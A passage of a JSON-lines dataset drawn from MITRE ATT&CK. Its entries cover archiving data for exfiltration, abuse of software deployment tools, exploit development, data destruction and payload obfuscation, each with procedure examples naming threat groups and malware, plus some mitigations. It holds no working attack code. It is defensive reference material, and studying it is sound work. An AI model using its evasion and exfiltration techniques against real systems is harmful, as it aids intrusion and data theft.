hosts in the United Kingdom, United States, France, and Spain. ", "XCSSET uses AppleScript to check the host's language and location with the command <code>user locale of (get system info)</code>.", "Cuba can check if Russian language is installed on the infected machine by using the function <code>GetKeyboardLayoutList</code>. ", "DropBook has checked for the presence of Arabic language in the infected machine's settings.", "SharpStage  has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.", "Some versions of DEATHRANSOM have performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or Tatar DEATHRANSOM would exit.", "Maze has checked the language of the machine with function <code>GetUserDefaultUILanguage</code> and terminated execution if the language matches with an entry in the predefined list.", "Avaddon checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.", "Spark has checked the results of the <code>GetKeyboardLayoutList</code> and the language name returned by <code>GetLocaleInfoA</code> to make sure they contain the word “Arabic” before executing.", "MarkiRAT can use the <code>GetKeyboardLayout</code> API to check if a compromised host's keyboard is set to Persian."], "is_subtechnique": true}
{"text": " An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data. Some 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.", "idx": "https://attack.mitre.org/techniques/T1560/001", "title": "Archive via Utility", "entity": "Archive via Utility", "entity_type": "techniques", "entity_context": ["FIN8 has used RAR to compress collected data before exfiltration.", "BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration.", "menuPass has compressed files before exfiltration using TAR and RAR.", "APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfiltration.", "APT41 created a RAR archive of targeted files for exfiltration.", "APT33 has used WinRAR to compress data prior to exfil.\t\n", "iKitten will zip up the /Library/Keychains directory before exfiltrating it.", "GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration.", "Fox Kitten has used 7-Zip to archive data.", "PoetRAT has the ability to compress files with zip.", "HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration.", "Micropsia creates a RAR archive based on collected files on the victim's machine.", "PUNCHBUGGY has Gzipped information and saved it to a random temp file before exfil.\t", "OopsIE compresses collected files with GZipStream before sending them to its C2 server.", "PoshC2 contains a module for compressing data using ZIP.", "Ke3chang is known to use RAR with passwords to encrypt data prior to exfiltration.", "System scans can be performed to identify unauthorized archival utilities.", "Turian can use WinRAR to create a password-protected archive for files of interest.", "MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.", "CopyKittens uses ZPP, a .NET console program, to compress files with ZIP.", "AppleSeed can zip and encrypt data collected on a target system.", "Sowbug extracted documents and bundled them into a RAR archive.", "PowerShower has used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration.", "Okrum was seen using a RAR archiver tool to compress/decompress data.", "APT3 has used tools to compress data before exfilling it.", "CORALDECK has created password-protected RAR, WinImage, and zip archives to be exfiltrated.", "Calisto uses the <code>zip -r</code> command to compress the data collected on the local system.", "Gallmaker has used WinZip, likely to archive data prior to exfiltration.", "Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration.", "Crutch has used the WinRAR utility to compress and encrypt stolen files.", "Magic Hound has used RAR to stage and compress local folders.", "Operation Wocao has archived collected files with WinRAR, prior to exfiltration.", "Chimera has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.", "WindTail has the ability to use the macOS built-in zip utility to archive files.", "DustySky can compress files via RAR while staging data to be exfiltrated.", "Ramsay can compress and archive collected files using WinRAR.", "Pupy can compress data with Zip before sending it over C2.", "Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration.", "Octopus has compressed data before exfiltrating it using a tool called Abbrevia. ", "APT39 has used WinRAR and 7-Zip to compress an archive stolen data.", "APT1 has used RAR to compress files before moving them outside of the victim network.", "InvisiMole uses WinRAR to compress data that is intended to be exfiltrated.", "Daserf hides collected data in password-protected .rar archives.", "APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection."], "is_subtechnique": true}
{"text": " Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.). Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.", "idx": "https://attack.mitre.org/techniques/T1072", "title": "Software Deployment Tools", "entity": "Software Deployment Tools", "entity_type": "techniques", "entity_context": ["APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.", "Grant access to application deployment systems only to a limited number of authorized administrators.", "Ensure that any accounts used by third-party providers to access these systems are traceable to the third-party and are not used throughout the network or used by other third-party providers in the same environment. Ensure there are regular reviews of accounts provisioned to these systems to verify continued business need, and ensure there is governance to trace de-provisioning of access that is no longer required. Ensure proper system and access isolation for critical network systems through use of account privilege separation.", "Have a strict approval policy for use of deployment systems.", "Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network.", "Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs.", "Ensure proper system isolation for critical network systems through use of firewalls.", "Ensure proper system and access isolation for critical network systems through use of group policy.", "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware.", "Ensure proper system and access isolation for critical network systems through use of multi-factor authentication.", "If the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.", "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement.", "Patch deployment systems regularly to prevent potential remote access through Exploitation for Privilege Escalation."], "is_subtechnique": false}
{"text": " Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017) As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit. Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).", "idx": "https://attack.mitre.org/techniques/T1587/004", "title": "Exploits", "entity": "Exploits", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure. Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017) To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018). In cloud environments, adversaries may leverage access to delete cloud storage,", "idx": "https://attack.mitre.org/techniques/T1485", "title": "Data Destruction", "entity": "Data Destruction", "entity_type": "techniques", "entity_context": ["Industroyer’s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.", "APT38 has used a custom secure delete function to make deleted files unrecoverable.", "Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory.", "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.", "StoneDrill has a disk wiper module that targets files other than those in the Windows directory.", "Sandworm Team has used the BlackEnergy KillDisk component to overwrite files on Windows-based Human-Machine Interfaces. ", "PowerDuke has a command to write random data across a file and delete it.", "REvil has the capability to destroy files and folders.", "Kazuar can overwrite files with random data before deleting them.", "Xbash has destroyed Linux-based databases as part of its ransomware capabilities.\t", "Shamoon attempts to overwrite operating system files and disk structures with image files. In a later variant, randomly generated data was used for data overwrites.", "Proxysvc can overwrite files indicated by the attacker before deleting them.", "BlackEnergy 2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.", "RawDisk was used in Shamoon to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.", "SDelete deletes data in a way that makes it unrecoverable.", "Olympic Destroyer overwrites files locally and on remote shares. ", "KillDisk deletes system files to make the OS unbootable. KillDisk also targets and deletes files with 35 different file extensions."], "is_subtechnique": false}
{"text": " Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "idx": "https://attack.mitre.org/techniques/T1027", "title": "Obfuscated Files or Information", "entity": "Obfuscated Files or Information", "entity_type": "techniques", "entity_context": ["Valak has the ability to base64 encode and XOR encrypt strings.", "Exaramel for Linux uses RC4 for encrypting the configuration.", "Comnie uses RC4 and Base64 to obfuscate strings.", "TeamTNT has encrypted its binaries via AES. TeamTNT has also encoded files using Base64.", "Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.", "Trojan.Karagany can base64 encode and AES-128-CBC encrypt data prior to transmission.", "BitPaymer has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.", "OLDBAIT obfuscates internal strings and unpacks them at startup.", "LightNeuron encrypts its configuration files with AES-256.", "OSX_OCEANLOTUS.D encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.", "MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.", "APT32 uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation. APT32 has also encoded payloads using Base64 and a framework called \"Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.", "Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.", "Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.", "Hancitor has used Base64 to encode malicious links. Hancitor has also delivered compressed payloads in ZIP files to victims.", "A RedLeaves configuration file is encrypted with a simple XOR key, 0x53.", "Dust Storm has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.", "A JPIN uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.", "Silence has used environment variable string substitution for obfuscation.", "APT33 has used base64 to encode payloads.", "Kobalos encrypts all strings using RC4 and bundles all functionality into a single function call. ", "Elderwood has encrypted documents and malicious executables.", "Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.", "FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads.", "Daserf uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.", "FlawedGrace encrypts its C2 configuration files with AES in CBC mode.", "MiniDuke can use control flow flattening to obscure code.", "SodaMaster can use \"stackstrings\" for obfuscation.", "Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.", "OopsIE uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.", "TRITON encoded the two inject.bin and imain.bin payloads.", "Dtrack has used a dropper that embeds an encrypted payload as extra data.", "Denis obfuscates its code and encrypts the API names. Denis also encodes its payload in Base64.", "Maze has decrypted strings and other important information during the encryption process. Maze also calls certain functions dynamically to hinder analysis.\t", "Ecipekac can use XOR, AES, and DES to encrypt loader shellcode.", "Frankenstein has run encoded commands from the command line.", "Operation Wocao has executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.", "KillDisk uses VMProtect to make reverse engineering the malware more difficult.", "SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe</code> process.", "SHOTPUT is obscured using XOR encoding and appended to a valid GIF file.", "Taidoor can use encrypted string blocks for obfuscation.", "Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.", "DOGCALL is encrypted using single-byte XOR.", "NanHaiShu encodes files in Base64.", "Bazar has used XOR, RSA2, and RC4 encrypted files.", "Bundlore has obfuscated data with base64, AES, RC4, and bz2.", "Penquin has encrypted strings in the binary for obfuscation.", "Chimera has encoded PowerShell commands.\t", "InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.", "CARROTBALL has used a custom base64 alphabet to decode files.", "Micropsia obfuscates the configuration with a custom Base64 and XOR.", "EKANS uses encoded strings in its process kill list. ", "Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.", "NOKKI uses Base64 encoding for strings.", "The PowerShell script with the RogueRobin payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.", "In one version of KeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware.", "Sibot has obfuscated scripts used in execution.", "Pillowmint has been compressed and stored within a registry key. Pillowmint has also obfuscated the AES key used for encryption.\t", "Ryuk can use anti-disassembly and code transformation obfuscation techniques.", "More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.", "Blue Mockingbird has obfuscated the wallet address in the payload binary.", "APT3 obfuscates files or information to help evade defensive measures.", "Invoke-PSImage can be used to embed a PowerShell script within the pixels of a PNG file.", "HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming.", "Lokibot has obfuscated strings with base64 encoding.", "PoisonIvy hides any strings related to its own indicators of compromise.", "Leviathan has obfuscated code using base64 and gzip compression.", "Windshift has used string encoding with floating point calculations.", "P.A.S. Webshell can use encryption and base64 encoding to hide strings and to enforce access control once deployed.", "PipeMon modules are stored encrypted on disk.", "Carberp has used XOR-based encryption to mask C2 server locations within the trojan.", "Strings in Attor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.", "Reaver encrypts some of its files with XOR.", "Empire has the ability to obfuscate commands using <code>Invoke-Obfuscation</code>.", "Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands.", "APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.", "APT37 obfuscates strings and payloads.", "Magic Hound malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.", "UBoatRAT encrypts instructions in the payload using a simple XOR cipher.", "RainyDay has downloaded as a XOR-encrypted payload.", "BoomBox can encrypt data using AES prior to exfiltration.", "Winnti for Linux can encode its configuration file with single-byte XOR encoding.", "APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR.", "Dacls can encrypt its configuration file with AES CBC.", "ZeroT has encrypted its payload with RC4.", "HAWKBALL has encrypted the payload with an XOR-based algorithm.", "SombRAT can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data.", "Some Orz strings are base64 encoded, such as the embedded DLL known as MockDll.", "The FIVEHANDS payload is encrypted with AES-128.", "ShadowPad has encrypted a virtual file system and various files.", "Bisonal's DLL file and non-malicious decoy file are encrypted with RC4.", "PolyglotDuke can custom encrypt strings.", "Seasalt obfuscates configuration data.", "GoldMax has written AES-encrypted and Base64-encoded configuration files to disk.", "APT18 obfuscates strings in the payload.", "Darkhotel has obfuscated code using RC4, XOR, and RSA.", "Honeybee drops files with base64-encoded data.", "Configuration data used by Rising Sun is encrypted using RC4.\t", "Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.", "Hydraq uses basic obfuscation in the form of spaghetti code.", "ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.", "menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.", "Netwalker's PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables. Netwalker's DLL has also been embedded within the PowerShell script in hex format.", "SpeakUp encodes its second-stage payload with Base64. ", "Conficker has obfuscated its code to prevent its removal from host machines.", "SDBbot has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.", "ShimRat has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.", "APT29 has used encoded PowerShell commands.", "Skidmap has encrypted it's main payload using 3DES. ", "EnvyScout can Base64 encode payloads.", "Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.", "Patchwork has obfuscated a script with Crypto Obfuscator.", "Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments, and used obfuscated or encrypted scripts.", "Pony attachments have been delivered via compressed archive files. Pony also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.\t", "Most strings in USBStealer are encrypted using 3DES and XOR and reversed.", "Anchor has obsuscated code with stack strings and string encryption.", "FatDuke can use base64 encoding, string stacking, and opaque predicates for obfuscation.", "FIN6 has used encoded PowerShell commands.", "Hildegard has encrypted an ELF file.", "Astaroth obfuscates its JScript code, and has used an XOR-based algorithm to encrypt payloads twice with different keys.", "Epic heavily obfuscates its code to make analysis more difficult.", "VERMIN is obfuscated using the obfuscation tool called ConfuserEx.", "Higaisa used Base64 encoded compressed payloads.", "PowerStallion uses a XOR cipher to encrypt command output written to its OneDrive C2 server.", "CORESHELL obfuscates strings using a custom stream cipher.", "NETWIRE has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.", "Cobalt Group obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4.", "Carbanak encrypts strings to make analysis more difficult.", "PoetRAT has used a custom encryption scheme for communication between scripts and pyminifier to obfuscate scripts.", "Siloscape itself is obfuscated and uses obfuscated API calls.", "StrongPity has used encrypted strings in its dropper component.", "BLUELIGHT has a XOR-encoded payload.", "A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.", "AuditCred encrypts the configuration.", "FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated scripts. ", "SamSam has been seen using AES or DES to encrypt payloads and payload components.", "GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts.", "Sliver can encrypt strings at compile time.", "APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.", "IcedID has utilzed encrypted binaries and base64 encoded strings.", "Remcos uses RC4 and base64 to obfuscate data, including Registry entries and file paths.", "Kessel's configuration is hardcoded and RC4 encrypted within the binary.", "APT39 has used malware to drop encrypted CAB files.", "FruitFly executes and stores obfuscated Perl scripts.", "Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64.", "Fox Kitten has base64 encoded scripts and payloads to avoid detection.", "StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.", "SynAck payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.", "ECCENTRICBANDWAGON has encrypted strings with RC4.", "A Volgmer variant is encoded using a simple XOR cipher.", "Sidewinder has used base64 encoding and ECDH-P256 encryption for scripts and files.", "CookieMiner has used base64 encoding to obfuscate scripts on the system. ", "BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.", "Elise encrypts several of its files, including configuration files.", "GoldenSpy's uninstaller has base64-encoded its variables. ", "NanoCore’s plugins were obfuscated with Eazfuscater.NET 3.3.", "IronNetInjector can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.", "Tropic Trooper has encrypted configuration files.", "CARROTBAT has the ability to download a base64 encoded payload and execute obfuscated commands on the infected host.", "Stuxnet uses encrypted configuration blocks and writes encrypted files to disk.", "QUADAGENT was likely obfuscated using Invoke-Obfuscation.", "Sandworm Team has used Base64 encoding within malware variants. Sandworm Team has also used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.", "Mofang has compressed the ShimRat executable within malicious email attachments. Mofang has also encrypted payloads before they are downloaded to victims.", "The DustySky dropper uses a function to obfuscate the name of functions and other parts of the malware.", "HiddenWasp encrypts its configuration and payload.", "Dridex's strings are obfuscated using RC4. ", "Sakula uses single-byte XOR obfuscation to obfuscate many of its files.", "GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.", "InnaputRAT uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.", "YAHOYAH encrypts its configuration file using a simple algorithm.", "Cardinal RAT encodes many of its artifacts and is encrypted (AES-128) when downloaded. ", "GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.", "CoinTicker initially downloads a hidden encoded file.", "Ramsay has base64-encoded its portable executable and hidden itself under a JPG header. Ramsay can also embed information within document footers.\t", "SHARPSTATS has used base64 encoding and XOR to obfuscate PowerShell scripts.", "Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware.", "Gallmaker obfuscated shellcode used during execution.", "RegDuke can use control-flow flattening or the commercially available .NET Reactor for obfuscation.", "BLINDINGCAN has obfuscated code using Base64 encoding.", "Mustang Panda has delivered initial payloads hidden using archives and encoding measures.", "SUPERNOVA contained Base64-encoded strings.", "GravityRAT supports file encryption (AES with the key \"lolomycin2017\").", "BoxCaon used the \"StackStrings\" obfuscation technique to hide malicious functionalities.", "Out1 has the ability to encode data.", "WindTail can be delivered as a compressed, encrypted, and encoded payload.", "Metamorfo has encrypted payloads and strings.", "Kazuar is obfuscated using the open source ConfuserEx protector. Kazuar also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.", "FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.", "Final1stspy obfuscates strings with base64 encoding.", "Lazarus Group malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.", "Kerrdown can encrypt, encode, and compress multiple layers of shellcode.", "A Night Dragon DLL included an XOR-encoded section.", "SQLRat has used a character insertion obfuscation technique, making the script appear to contain Chinese characters.", "REvil has used encrypted strings and configuration files.", "The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys.", "ShimRatReporter encrypted gathered information with a combination of shifting and XOR using a static key.", "Shamoon contains base64-encoded strings.", "BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect.", "Turian can use VMProtect for obfuscation.", "Carbon encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.", "TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file.", "HotCroissant has encrypted strings with single-byte XOR and base64 encoded RC4.", "Fysbis has been encrypted using XOR and RC4. ", "jRAT’s Java payload is encrypted with AES. Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of jRAT also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.", "Avaddon has used encrypted strings.", "The SMOKEDHAM source code is embedded in the dropper as an encrypted string.", "Drovorub has used XOR encrypted payloads in WebSocket client to server messages.", "QakBot can use obfuscated and encoded scripts; it has also hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.", "Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.", "TajMahal has used an encrypted Virtual File System to store plugins.", "Cuba has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload. ", "Transparent Tribe has dropped encoded executables on compromised hosts.", "TA551 has used obfuscated variable names in a JavaScript configuration file.", "Cobalt Strike can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.", "APT41 used VMProtected binaries in multiple intrusions.", "Rocke has modified UPX headers after packing files to break unpackers.", "Conti can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.", "PUNCHTRACK is loaded and executed by a highly obfuscated launcher.", "Avenger has the ability to XOR encrypt files to be sent to C2.", "PUNCHBUGGY has hashed most its code's functions and encrypted payloads with base64 and XOR.", "Ebury has obfuscated its strings with a simple XOR encryption with a static key.", "SoreFang has the ability to encode and RC6 encrypt data sent to C2.", "Agent Tesla has had its code obfuscated in an apparent attempt to make analysis difficult. Agent Tesla has used the Rijndael symmetric encryption algorithm to encrypt strings.", "TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.", "Imminent Monitor has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.", "A version of XTunnel introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.", "TA505 has password-protected malicious Word documents and used base64 encoded PowerShell commands.", "StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption.", "Remexi obfuscates its configuration data with XOR.", "OilRig has encrypted and encoded data in its malware, including by using base64.", "BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.", "MCMD can Base64 encode output strings prior to sending to C2.", "Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.", "BackConfig has used compressed and decimal encoded VBS scripts.", "The Grandoreiro payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.", "The WastedLocker payload includes encrypted strings stored within the .bss section of the binary file.   ", "PowerSploit contains a collection of ScriptModification modules that compress and encode scripts and payloads.", "KGH_SPY has used encrypted strings in its installer.", "Hi-Zor uses various XOR techniques to obfuscate its components.", "Zeus Panda encrypts strings with XOR and obfuscates the macro code from the initial payload. Zeus Panda also encrypts all configuration and settings in AES and RC4.", "APT19 used Base64 to obfuscate commands and the payload.", "PS1 is distributed as a set of encrypted files and scripts.", "POWERSTATS uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code. POWERSTATS's backdoor code is a multi-layer obfuscated, encoded, and compressed blob.  POWERSTATS has used PowerShell code with custom string obfuscation ", "Waterbear has used RC4 encrypted shellcode.", "Aria-body has used an encrypted configuration file for its loader.", "njRAT has included a base64 encoded executable.", "Turla has used encryption (including salted 3DES via PowerSploit's <code>Out-EncryptedScript.ps1</code>), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.", "Some strings in HOMEFRY are obfuscated with XOR x56.", "BendyBear has encrypted payloads using RC4 and XOR.", "POSHSPY appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.", "Pisloader obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.", 